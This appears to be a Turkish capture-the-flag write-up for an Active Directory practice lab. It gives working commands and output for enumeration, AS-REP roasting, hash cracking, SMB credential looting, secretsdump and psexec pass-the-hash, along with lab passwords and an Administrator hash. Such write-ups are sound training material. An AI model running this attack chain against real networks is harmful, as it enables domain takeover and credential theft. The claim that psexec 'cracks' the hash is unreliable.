Nmap ile tarama yapıyoruz.
```bash
nmap -sV -p- 10.10.245.247 -Pn -o nmap -T5
```
sonuçlar:
- 135/tcp   open     msrpc         Microsoft Windows RPC
- 139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
- 3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
- 389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)

bu şekilde ise 
/etc/host içine  ekliyoruz

```bash
echo "10.10.245.247 spookysec.local" >> /etc/hosts
```
daha sonra nmap sonucunda çıkan bütün portları:
```bash
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389 -A -T4 spookysec.local
```
tarama yapıyoruz
sonuçlar:
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-04-25T12:42:55+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-25T12:42:47+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local


bu şekilde oluyor

daha sonra 

```bash
enum4linux -a  spookysec.local
```

sonra kerbrute ile system üzerindeki kullanıcalı bulmamız lazım bunun için;
```bash
kerbrute userenum --dc spookysec.local0 -d spookysec.local userlist.txt
```
sonuçlar:
+ validusername svc-admin@spookysec.local
+ validusername backup@spookysec.local

daha sonra bulduğumuz userlerin paralo hashlerini alıcaz
/opt/impacket/examples altından

```bash
python3 GetNPUsers.py spookysec.local/svc-admin -no-pass 
```
elde ettiğimiz hashi;

```bash
john -w=passwordlist.txt hash.txt
```

şimdi elde ettiğimiz kullanıcı ve pass ile smbye giricez

```bash
smbclient -L spookysec.local --user svc-admin
```
sonuçlar:
 Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

şimdi backup içine giricez:
```bash
smbclient \\\\spookysec.local\\backup --user svc-admin
```
sonuçlar:
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3630403 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit

backup_cred info: backup@spookysec.local:backup2517860 =>> backup2517860 bu kısım şifre

daha sonra  bu kullanıcı hesabının erişebildiği tüm parola karmalarını alabileceğiz.

/opt/impacket/examples altından

```bash
python3 secretsdump.py -just-dc backup@spookysec.local
```
sonuçlar:
kullanıcı_adı:RID:kırılıcak hash bu aşağıdaki 2 hashler
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc   :::


buradaki hashi kırıcaz 
/opt/impacket/examples altından
```bash
python3 psexec.py Administrator:@spookysec.local -hashes 0e0363213e37b94221497260b0bcb4fc
```
bu şifreyi kırar ve içeriye giriş yapar.
